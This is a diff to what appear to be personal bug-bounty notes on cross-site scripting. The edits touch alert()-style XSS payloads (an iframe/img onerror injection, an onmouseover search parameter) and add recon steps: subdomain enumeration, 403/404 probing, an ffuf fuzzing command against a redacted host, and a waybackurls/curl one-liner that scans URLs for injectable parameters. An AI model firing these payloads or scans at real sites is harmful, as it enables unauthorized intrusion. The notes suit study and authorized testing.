@@ -1,3 +1,4 @@
+
 Xss
 REFLECTED
 1)
@@ -308,7 +309,7 @@ location.search
 
 window.location.hash.slice(1)
 
-<iframe src="www.google.com" onload="this src+='<img src=1 onerror=alert(1)"'>
+   /#<iframe src="www.google.com" onload="this src+='<img src=1 onerror=alert(1)"'>
  
      
 
@@ -385,9 +386,24 @@ This payload puts a twist on requiring user interaction. By injecting a style ta
 
 
 
-        /?search=<IMG%20SRC=1%20onmouseover=alert()>                         USING CASE SENSETIVE
-
-
+        /?search=<IMG%20SRC=1%20onmouseover=alert()>             USING CASE SENSETIVE
+        
+        
+        
+        running 404 page example
+        
+        conduct a subdomain enumeration using tools such as Subfinder, Amass, and crt.sh.
+        performed a DNS brute force, resulting in the discovery of nearly 40,000 subdomains. 
+        running HTTPX on these subdomains, Ito identified  2,500 live and active ones.
+        check for active subdomain painstakly
+        
+         encountering the 403 Error,  decide to test whether if it is  a global restriction affecting all pages or specific to the main page by providing the subdomain with a dummy path.
+         example  = rplicense.redacted.com/dummy
+         
+         After inputting the dummy path, the 403 status code might  transformed into a 404 Not Found, indicating that the 403 code was exclusive to the main web page and not applicable to every        c    conceivable path. At this point, commenced fuzzing the web application using ffuf along with a wordlist named raft-large. 
+      Here’s the command:   
+      ffuf -u "rplicense.redacted.com/FUZZ" -w /path/to/word-list -H "User-Agent: Mozilla/5.0 (Galaxy S22; Android 6) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/111.0.5628.105 Mobile Safari/537.48" -  rate 20  also fuzz achive/directory and check for forms and sumit payload where neccasry
+ 
 
 
 
@@ -420,4 +436,3 @@ To compensate for this, you can attach an event listener to the document which w
     Find the parameters which are not filtering special characters - One Liner
      echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
 cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
-
